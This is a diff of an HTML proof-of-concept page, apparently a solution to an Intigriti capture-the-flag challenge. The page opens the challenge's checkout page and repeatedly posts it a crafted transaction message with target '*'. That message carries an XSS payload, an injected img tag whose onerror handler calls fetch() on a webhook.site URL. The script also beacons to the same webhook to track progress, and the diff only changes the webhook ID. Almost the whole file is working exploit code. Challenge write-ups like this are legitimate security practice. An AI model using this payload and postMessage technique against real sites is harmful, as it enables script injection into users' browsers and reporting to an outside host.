@@ -2,7 +2,7 @@
 <body>
     <script>
         const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00000001", "_blank");
-        const xssPayload = '\"\u003E\u003Cimg src=x onerror=\"fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/XSS_SUCCESS`)\"\u003E';
+        const xssPayload = '\"\u003E\u003Cimg src=x onerror=\"fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\"\u003E';
         const payload = {
             type: "submitTransaction",
             transaction: {
@@ -14,13 +14,13 @@
 
         const interval = setInterval(() => {
             if (win) {
-                fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/windowisopened`);
+                fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/windowisopened`);
                 win.postMessage(payload, "*");
             }
         }, 1000);
         
         setTimeout(() => {
-            fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/redirected`);
+            fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/redirected`);
             window.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
         }, 5000);
     </script>
